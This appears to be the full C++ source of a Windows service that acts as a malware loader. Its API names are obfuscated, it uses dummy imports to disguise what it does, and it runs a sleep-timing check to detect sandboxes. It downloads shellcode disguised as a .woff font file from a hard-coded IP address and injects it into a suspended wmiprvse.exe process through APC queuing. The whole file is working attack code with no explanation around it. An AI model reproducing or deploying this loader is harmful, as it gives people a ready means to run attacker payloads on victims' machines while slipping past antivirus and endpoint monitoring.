#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <wininet.h>
#include <string.h>
#include <chrono>
#include <vector>
#include <thread>
#include <wincrypt.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <time.h>
#include <bcrypt.h>
#include <iostream>
#include <map>
#include <string>
#include <fstream>

#pragma comment (lib, "Wininet.lib")

typedef BOOL(WINAPI* WriteProcessMemoryFunc)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
char aProcmemory[] = { 'W', 'r', 'i', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y', '\0'};
WriteProcessMemoryFunc pwProcmem = (WriteProcessMemoryFunc)GetProcAddress(GetModuleHandleA("kernel32.dll"), aProcmemory);

typedef BOOL(WINAPI* QueueUserAPCFunc)(PAPCFUNC, HANDLE, ULONG_PTR);
char aQueueUserAPC[] = { 'Q', 'u', 'e', 'u', 'e', 'U', 's', 'e', 'r', 'A', 'P', 'C', '\0'};
QueueUserAPCFunc pwQueueUserAPC = (QueueUserAPCFunc)GetProcAddress(GetModuleHandleA("kernel32.dll"), aQueueUserAPC);

typedef BOOL(WINAPI* CreateProcessAFunc)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
char aCreateProcess[] = { 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', '\0'};
CreateProcessAFunc pwCreateProcess = (CreateProcessAFunc)GetProcAddress(GetModuleHandleA("kernel32.dll"), aCreateProcess);

typedef LPVOID(WINAPI* VirtualAllocExFunc)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
char aVirtualAllocEx[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 'E', 'x', '\0'};
VirtualAllocExFunc pwVirtualAllocEx = (VirtualAllocExFunc)GetProcAddress(GetModuleHandleA("kernel32.dll"), aVirtualAllocEx);

typedef BOOL(WINAPI* VirtualProtectFunc)(LPVOID, SIZE_T, DWORD, PDWORD);
char aVirtualProtect[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', '\0'};
VirtualProtectFunc pwVirtualProtect = (VirtualProtectFunc)GetProcAddress(GetModuleHandleA("kernel32.dll"), aVirtualProtect);

typedef BOOL(WINAPI* VirtualAllocExNumaFunc)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD, DWORD);
char aVirtualAllocExNuma[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 'E', 'x', 'N', 'u', 'm', 'a', '\0'};
VirtualAllocExNumaFunc pwVirtualAllocExNuma = (VirtualAllocExNumaFunc)GetProcAddress(GetModuleHandleA("kernel32.dll"), aVirtualAllocExNuma);

BOOL GetPayloadFromUrl(LPCWSTR szUrl, std::vector<BYTE>& payload) {
    HINTERNET hInternet = InternetOpenW(L"A Custom User Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return FALSE;
    }

    HINTERNET hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    if (!hInternetFile) {
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    DWORD bytesRead;
    BYTE buffer[4096];
    while (InternetReadFile(hInternetFile, buffer, sizeof(buffer), &bytesRead) && bytesRead != 0) {
        payload.insert(payload.end(), buffer, buffer + bytesRead);
    }

    if (bytesRead == 0 && GetLastError() != ERROR_SUCCESS) {
        InternetCloseHandle(hInternetFile);
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    InternetCloseHandle(hInternetFile);
    InternetCloseHandle(hInternet);
    return TRUE;
}

PVOID Helper(PVOID *ppAddress) {

    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS | HEAP_ZERO_MEMORY, 0x100);
    if (!pAddress)
        return NULL;
    
    srand((unsigned)time(NULL));
    *(int*)pAddress = rand() % 0xFF;
    
    *ppAddress = pAddress;
    return pAddress;
}

VOID ModifiedIatCamouflage() {

    PVOID   pAddress    = NULL;
    int*    A           = (int*)Helper(&pAddress);
    unsigned __int64 i = 0; 
    
    if (*A > 400) {

        i = GetTickCount();
        i = GetCurrentThreadId();
        SleepEx(0, FALSE);  
        OutputDebugStringA("Unreachable code");
        i = GetTickCount();
        i = CreateDirectoryA(NULL, NULL);
        i = DeleteFileA(NULL);
        i = SetEndOfFile(NULL);
    }

    HeapFree(GetProcessHeap(), 0, pAddress);
}

void evade() {    
    std::chrono::steady_clock::time_point startTime = std::chrono::steady_clock::now();
    std::this_thread::sleep_for(std::chrono::milliseconds(2000));
    std::chrono::steady_clock::time_point endTime = std::chrono::steady_clock::now();
    std::chrono::duration<double> elapsedTime = endTime - startTime;

    if (elapsedTime.count() < 1.5)
    {
        exit(1);
    }
};

char uriError[] = "Error: Unable to retrieve the specified URI.\n";

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;

void ServiceMain(int argc, char** argv);
void ControlHandler(DWORD request);


void ServiceMain(int argc, char** argv) {
    // Initialize service status
    ServiceStatus.dwServiceType = SERVICE_WIN32;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode = 0;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwCheckPoint = 0;
    ServiceStatus.dwWaitHint = 0;


    hStatus = RegisterServiceCtrlHandler(TEXT("YourServiceName"), (LPHANDLER_FUNCTION)ControlHandler);
    if (hStatus == (SERVICE_STATUS_HANDLE)0) {
        // Handle error
        return;
    }

    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &ServiceStatus);

    evade();
    std::vector<BYTE> payload;
    LPCWSTR url = L"http://192.168.45.194/shellcode.woff";

    if (!GetPayloadFromUrl(url, payload)) {
        printf(uriError);
    }

    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    pwCreateProcess("C:\\Windows\\System32\\wbem\\wmiprvse.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    
    HANDLE victimProcess = pi.hProcess;
    HANDLE threadHandle = pi.hThread;

    LPVOID shellAddress = pwVirtualAllocEx(victimProcess, NULL, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    PVOID pBaseAddress = nullptr;
    SIZE_T* bytesWritten = 0;

    pwProcmem(victimProcess, shellAddress, payload.data(), payload.size(), bytesWritten);

    pwVirtualProtect(shellAddress, payload.size(), PAGE_EXECUTE_READ, NULL);

    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;

    pwQueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, (ULONG_PTR)nullptr);
    
    ResumeThread(threadHandle);

}

void ControlHandler(DWORD request) {
    switch (request) {
        case SERVICE_CONTROL_STOP:
            ServiceStatus.dwWin32ExitCode = 0;
            ServiceStatus.dwCurrentState = SERVICE_STOPPED;
            SetServiceStatus(hStatus, &ServiceStatus);
            return;

        case SERVICE_CONTROL_SHUTDOWN:
            ServiceStatus.dwWin32ExitCode = 0;
            ServiceStatus.dwCurrentState = SERVICE_STOPPED;
            SetServiceStatus(hStatus, &ServiceStatus);
            return;

        default:
            break;
    }

    SetServiceStatus(hStatus, &ServiceStatus);
}

int main() {
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        { (LPSTR)"YourServiceName", (LPSERVICE_MAIN_FUNCTION)ServiceMain },
        { NULL, NULL }
    };

    if (!StartServiceCtrlDispatcher(ServiceTable)) {
    }

    return 0;
}
